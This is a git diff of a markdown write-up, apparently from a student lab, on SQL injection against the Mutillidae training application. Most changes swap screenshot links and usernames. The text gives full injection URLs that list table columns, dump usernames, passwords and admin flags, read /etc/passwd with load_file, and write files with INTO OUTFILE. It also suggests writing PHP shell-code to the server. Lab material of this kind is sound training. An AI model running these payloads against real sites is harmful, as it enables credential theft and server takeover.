@@ -132,26 +132,23 @@ Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns wher
 Here we are trying to extract column names from the “accounts” table.
 
 
-
-
-![Screenshot 2023-06-10 225659](https://github.com/praveenst13/sqlinjection/assets/118787793/c820f87a-30cb-485b-b423-f6fd0e67c96e)
 The column names of the accounts is displayed below for the following url:
 
-http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details 
+http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=sivaram%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details 
+![20](https://github.com/sivaram-R/sqlinjection/assets/121165794/8a7e97d9-6850-4e95-8fe0-fe1272a2a252)
 
-![Screenshot 2023-06-10 225659](https://github.com/praveenst13/sqlinjection/assets/118787793/c820f87a-30cb-485b-b423-f6fd0e67c96e)
-
-
-
+![21](https://github.com/sivaram-R/sqlinjection/assets/121165794/1668fd47-44f9-4687-ad7f-c7c0808706ea)
 
 
 Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.
 
 Ex: (union select 1,username,password,is_admin,5 from accounts).
 
-http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details
+http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=sivaram%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details
 
-![Screenshot 2023-06-10 225759](https://github.com/praveenst13/sqlinjection/assets/118787793/f7dd79fb-c11c-41f3-8019-06685e9cd759)
+![22](https://github.com/sivaram-R/sqlinjection/assets/121165794/56fc761e-392e-4ffe-95cb-fad848e76727)
+
+![23](https://github.com/sivaram-R/sqlinjection/assets/121165794/e6257257-1536-42c2-8ca3-fbc6b283e760)
 
 
 ## Reading and writing files on the web-server
@@ -160,7 +157,8 @@ We can use the “LOAD_FILE()” operator to peruse the contents of any file con
 Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).
 
 http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details
-![Screenshot 2023-06-10 225846](https://github.com/praveenst13/sqlinjection/assets/118787793/13f4a113-06fc-4d62-a8ec-6525c4ec1343)
+![24](https://github.com/sivaram-R/sqlinjection/assets/121165794/eb4e7934-2521-4d82-8ab0-d68991a8fddd)
+![25](https://github.com/sivaram-R/sqlinjection/assets/121165794/7666fcb7-711c-42a2-ade6-2c73fd728d40)
 the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server.
 Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).
 
